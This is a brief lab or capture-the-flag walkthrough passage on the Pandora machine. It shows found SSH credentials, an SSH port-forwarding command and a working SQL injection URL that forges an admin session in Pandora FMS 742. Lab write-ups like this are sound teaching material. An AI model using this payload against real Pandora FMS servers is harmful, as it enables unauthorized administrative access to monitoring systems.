After enumeration we find credentials for `daniel` we can ssh in with these

daniel:HotelBabylon23

browsing to `/var/www/pandora/pandora_console/index.php` 
we see that it is running Pandora FMS 


---

### port forwarding

web gui is running on port 80, we must forward this to our host

`ssh -L 9090:127.0.0.1:80 daniel@victim_machine`

We can now access the web gui at `http://localhost:9090`


To get in we will have to follow this blog for the SQLi

https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained

We end up with this payload:

```
http://localhost:9090/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
```

Open another tab and go back to `http://localhost:9090/pandora_console/`

We now have access to the web gui

